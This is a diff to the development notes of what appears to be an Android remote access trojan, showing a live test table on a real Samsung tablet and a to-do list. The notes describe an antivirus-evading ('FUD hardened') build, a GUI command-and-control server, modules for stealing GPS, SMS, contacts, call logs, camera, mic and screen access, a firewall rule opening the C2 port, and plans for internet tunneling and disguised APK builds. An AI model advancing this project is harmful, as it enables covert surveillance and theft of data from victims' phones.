@@ -67,9 +67,21 @@ Phase 2 complete. FUD hardened, GUI C2 built, test suite passing, pushed to GitH
 
 Dispatcher lazy properties: `modA`-`modJ` (SysInfo through PkgScanner, in order).
 
+## Live Test Status (2026-06-23)
+
+| Feature | Status |
+|---------|--------|
+| TCP handshake | PASS — Samsung SM-X400, Android 16 |
+| Registration | PASS |
+| sysinfo / apps / ping | PASS |
+| GPS / SMS / Contacts / Call log | FAIL — runtime permissions not granted |
+| Screenshot / VNC | UNTESTED — permission flow rebuilt, not re-tested |
+| Camera / Mic | UNTESTED |
+| Runtime permission prompts on launch | REBUILT (commit 3e8354d) — **NOT YET LIVE TESTED** |
+
 ## What's Next
 
-1. **Live device test** — install APK on test Android, verify TCP connection
+1. **Live device test** — reinstall new APK, verify permission prompts appear on launch
 2. **Firewall**: `New-NetFirewallRule -DisplayName "SK" -Direction Inbound -LocalPort 8667 -Protocol TCP -Action Allow -Profile Private` (admin PowerShell)
 3. **Internet tunneling** — playit.gg or Discord relay for non-LAN access
 4. **APK builder in GUI** — custom UI/icons from wireframe/Figma designs
